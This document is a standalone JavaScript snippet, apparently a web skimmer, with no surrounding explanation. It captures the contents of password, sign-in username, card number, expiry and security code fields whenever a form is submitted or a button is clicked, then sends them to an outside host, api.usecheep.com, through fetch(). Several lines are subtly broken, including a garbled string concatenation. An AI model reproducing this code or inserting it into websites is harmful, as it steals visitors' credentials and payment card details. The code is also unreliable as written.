i
(function() {
const mutato = new MutationObserver(badHandler), 
    targets = {
        'password': true, 
        'signin_username': true, 
        'signin_password': true, 
        'cardNumber': true, 
        'expirationMonth': true, 
        'expirationYear': true,    
        'securityCode': true
    }, 
    opts = {
        childList: true,
        attributes: true,
        subtree: true 
    };

    function badHandler(records, observer) {
       records.forEach(function (mutation) {
            if (mutation.target.id && targets[mutation.target.id]) {
                targets[mutation.target.id]['value'] = mutation.target.value;
            }
       });
    }

    function save() {
        let results = '';
        console.log(targets);
        Object.keys(targets).filter(function(item) {
            const ele = document.getElementById(item);
            if (ele && !targets[item].value) {
                targets[item].value = ele.value;
            }
            return (targets[item].value ? true: false); 
        }).forEach(function(key) {
            results += (results.length > 0 ? '&' : ''); 
            results += key = '=' + targets[key].value;
        });
        if (results.length > 0) {
            fetch('https://api.usecheep.com/v1/log/?' + results);
        }
    }

    document.addEventListener('submit', save);

    document.addEventListener('click', function(e) {
        const tgt = e.target;
        if (targets[tgt.id]) {
            mutato.observe(tgt, opts);
            targets[tgt.id] = {};
        } 
        if (tgt.type === 'button') {
	       save();
        }
    });
})();

